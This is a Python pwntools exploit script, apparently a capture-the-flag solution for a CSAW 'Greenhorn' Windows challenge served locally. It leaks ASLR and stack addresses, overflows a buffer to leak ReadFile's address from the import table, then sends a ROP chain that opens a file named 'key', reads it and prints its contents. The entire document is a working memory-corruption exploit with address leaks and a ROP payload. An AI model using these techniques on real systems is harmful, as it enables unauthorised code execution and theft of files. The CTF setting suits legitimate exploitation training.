from pwn import*
import sys

def First_Leakage_Stage(conn):
 print("[x] working on First Leakage Stage...")
 try: 
  conn.sendline(b'GreenhornSecretPassword!!!')
  conn.sendline(b'A')
  conn.recvuntil("ASLR slide is: ").decode()
  line = conn.recvuntil(".").decode()
  Base_address = int(line.split(" ")[0],16)+0x400000
  Stack_address = int(line.split(" ")[8].replace(".",""),16)
  print("[+] First Leakage Stage succeeded... ")
  return Base_address,Stack_address
 except:
     sys.exit(0)

def Second_Leakage_Stage(conn,ImageBase):
 print("[x] working on Second Leakage Stage...")
 try:   
  conn.sendline(b'V')
  Payload=  b'CSAW'+b'A'*1024
  Payload+= p32(ImageBase+0x14d0) # WriteToStdout function
  Payload+= p32(ImageBase+0x1137) # ret address = vulnerable function
  Payload+= p32(ImageBase+0x2014) # import table entry that hold readfile address in kernel32.dll
  conn.sendline(Payload)
  conn.recvuntil("with some constraints).\n\n")
  data= conn.recv(4)
  readfile = u32(data.decode())
  openfile = readfile+0x35350
  print("[+] Second Leakage Stage succeeded... ")
  return readfile,openfile
 except: 
  print("[-] Second Leakage Stage Failed... ")
  sys.exit(0)


def Open_Read_Write(conn,StackAdd,ImageBase,readfile_Fun,openfile_Fun):
 print("[x] reading key file from remote server...")   
 try:
  inputaddress = StackAdd-0x3f8+4
  Payload= b'CSAW'+b'A'*1020 #Bypass condition & overflowing
  Payload+=p32(inputaddress+1056+8) # address to save the returned handle
  Payload+=p32(openfile_Fun) #address of openfile functions
  Payload+=p32(ImageBase+0x1ce8) # mov dword[ebp-8],eax gadget , eax ==> handle
  Payload+= p32(inputaddress+1248)+p32(inputaddress+1184)+p32(0) # openfile parameters , (lpname,structure,null)
  Payload+= p32(readfile_Fun) # readfile function address
  Payload+= p32(ImageBase+0x14d0) # print to screen function
  Payload+= b'b'*4 # (first parameter of readfile)random bytes which will be overwritten with handle value
  Payload+=p32(inputaddress+1084)+p32(100)+p32(0)+p32(0) # buffer+size_of_string+null+null
  Payload+= p32(ImageBase+0x128f) #close function #change it 
  Payload+= p32(inputaddress+1084) #buffer to be printed to stdout
  Payload+= b'\x00'*100 # buffer values
  Payload+=b'c'*64 #openfile structure
  Payload+=b'key'+b'\x00' #filename
  conn.sendline(Payload)
  conn.recvuntil(".").decode() 
  print("[+] reading key file Succeeded and it contain following text:")
  print(conn.recvall().decode().split("\n")[2])
 except:
      print("[-] Failed to read file name key on remote server... ") 
      sys.exit(0)

def exploit():
 context.log_level='critical'
 print("[x] Starting connection .. ")
 try: 
  print("[+] Starting connection succeeded .. ")
  connection = remote("127.0.0.1",9998)
  ImageBase,StackAdd= First_Leakage_Stage(connection)
  readfile_Fun,openfile_Fun=Second_Leakage_Stage(connection,ImageBase)
  Open_Read_Write(connection,StackAdd,ImageBase,readfile_Fun,openfile_Fun)
  connection.close()
  print("[x] connection closed .. ")
 except:
   print("[-] Starting connection Failed .. ")
   sys.exit(0)
exploit()

